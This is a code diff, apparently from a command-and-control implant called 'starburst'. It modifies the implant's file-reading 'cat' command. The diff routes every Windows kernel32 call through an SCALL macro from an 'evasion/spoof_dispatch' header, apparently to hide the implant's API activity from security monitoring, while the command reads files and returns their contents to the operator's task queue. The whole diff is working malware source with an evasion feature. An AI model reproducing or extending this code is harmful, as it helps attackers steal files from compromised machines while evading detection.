@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_CAT
 
@@ -28,9 +29,9 @@ auto declfn starburst::cmd_cat(
     memory::copy( path_buf, path, copy_len );
 
     wchar_t wpath[520] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, path_buf, -1, wpath, 520 );
 
-    HANDLE h_file = inst.kernel32.CreateFileW(
+    HANDLE h_file = (HANDLE)SCALL( inst, kernel32.CreateFileW,
         wpath, GENERIC_READ, FILE_SHARE_READ,
         nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
 
@@ -41,8 +42,8 @@ auto declfn starburst::cmd_cat(
     }
 
     LARGE_INTEGER file_size;
-    if ( !inst.kernel32.GetFileSizeEx( h_file, &file_size ) ) {
-        inst.kernel32.CloseHandle( h_file );
+    if ( !SCALL( inst, kernel32.GetFileSizeEx, h_file, &file_size ) ) {
+        SCALL( inst, kernel32.CloseHandle, h_file );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetFileSizeEx failed" ) ) );
         return;
@@ -52,7 +53,7 @@ auto declfn starburst::cmd_cat(
 
     // cap at 1MB to avoid OOM
     if ( size > 1048576 ) {
-        inst.kernel32.CloseHandle( h_file );
+        SCALL( inst, kernel32.CloseHandle, h_file );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "file too large (>1MB)" ) ) );
         return;
@@ -60,16 +61,16 @@ auto declfn starburst::cmd_cat(
 
     auto buf = static_cast<char*>( inst.heap_alloc( size + 1 ) );
     if ( !buf ) {
-        inst.kernel32.CloseHandle( h_file );
+        SCALL( inst, kernel32.CloseHandle, h_file );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
     }
 
     DWORD bytes_read = 0;
-    inst.kernel32.ReadFile( h_file, buf, size, &bytes_read, nullptr );
+    SCALL( inst, kernel32.ReadFile, h_file, buf, size, &bytes_read, nullptr );
     buf[bytes_read] = '\0';
-    inst.kernel32.CloseHandle( h_file );
+    SCALL( inst, kernel32.CloseHandle, h_file );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, buf );
     inst.heap_free( buf );
